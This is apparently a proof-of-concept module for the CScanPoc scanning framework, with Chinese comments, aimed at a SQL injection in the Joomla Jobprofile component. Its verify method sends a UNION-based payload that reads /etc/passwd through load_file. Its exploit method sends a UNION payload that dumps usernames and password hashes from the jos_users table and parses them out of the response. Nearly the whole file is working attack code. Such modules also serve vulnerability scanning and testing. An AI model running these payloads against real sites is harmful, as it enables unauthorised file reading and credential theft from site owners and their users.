# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0057'  # 平台漏洞编号
    # 漏洞名称
    name = 'Joomla Jobprofile Component (com_jobprofile) - SQL Injection'
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        Joomla Jobprofile 组件 index.php 的参数id由于过滤不严，导致出现SQL注入漏洞。
        远程攻击者可以利用该漏洞执行SQL指令。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-72384'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7d410191-d192-4e58-b7d3-43af0f9acd99'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 文件名称
            filename = '/etc/passwd'
            # 进行16进制编码
            hexfilename = '0x'+filename.encode('hex')
            # 访问的地址
            exploit = '/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id='
            # 利用Union方式读取信息
            payload = "-1+union+all+select+1,load_file(" + \
                hexfilename+"),3,4,5,6,7,8,9+from+jos_users--"
            # 构造漏洞利用连接
            vulurl = arg+exploit+payload
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=50)
            # 判断返回结果
            if resp.status_code == 200:
                match = re.search('root:.+?:0:0:.+?:.+?:.+?',
                                  resp.text, re.I | re.M)
                # 读取文件成功
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 访问的地址
            exploit = '/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id='
            # 利用Union方式读取信息
            payload = "-1+union+all+select+1,concat(0x247e7e7e24,username,0x2a2a2a,password"\
                ",0x247e7e7e24),3,4,5,6,7,8,9+from+jos_users--"
            # 构造漏洞利用连接
            vulurl = arg+exploit+payload
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 提取信息的正则表达式
            parttern = '\$~~~\$(.*)\*\*\*(.*)\$~~~\$'
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=50)
            # 检查是否含有特征字符串
            if '$~~~$' in resp.text:
                # 提取信息
                match = re.search(parttern, resp.text, re.M | re.I)
                if match:
                    username = match.group(1)
                    password = match.group(2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 密码为{password}'.format(
                        target=self.target, name=self.vuln.name, username=username, password=password))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
